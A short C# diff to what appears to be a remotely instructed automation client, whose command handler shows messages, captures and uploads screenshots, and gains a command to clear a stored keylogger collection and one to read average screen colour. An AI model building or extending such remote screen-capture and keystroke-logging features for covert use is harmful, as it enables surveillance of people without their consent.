@@ -44,7 +44,7 @@ namespace CASL.Bll
         /// </summary>
         /// <param name="screenWidth"></param>
         /// <param name="screenHeight"></param>
-        public void Init(int screenWidth,int screenHeight,BaseForm form )
+        public void Init(int screenWidth,int screenHeight,BaseForm form)
         {
             InstuctionNames = InstructionCommandType.CountDown.GetNames(":");
             this.screenWidth = screenWidth;
@@ -164,7 +164,7 @@ namespace CASL.Bll
 
                 //300:请输入验证码
                 case InstructionCommandType.ShowMessage:                        
-                        form.ShowMessage(commandValue);                  
+                        form.AlertMessage(commandValue);                  
                         break;
 
                 //301:10
@@ -189,7 +189,14 @@ namespace CASL.Bll
                     var fileName = DateTime.Now.Ticks + ".bmp";
                     instruqctionResult.Data = dm.Capture(values[0].ToInt(), values[1].ToInt(), values[2].ToInt(), values[3].ToInt(), fileName);
                     UploadImg(fileName);
-                        break;
+                    break;
+                case InstructionCommandType.ClearAllKey:
+                    CommandManager.Keyloggers.Clear();
+                    break;
+                case InstructionCommandType.GetAveRGB:
+                    var  averbg = dm.GetAveRGB(values[0].ToInt(), values[1].ToInt(), values[2].ToInt(), values[3].ToInt());
+                    instruqctionResult.Data = averbg;
+                    break;
                     
             }
             instruqctionResult.IsSucceed = true;
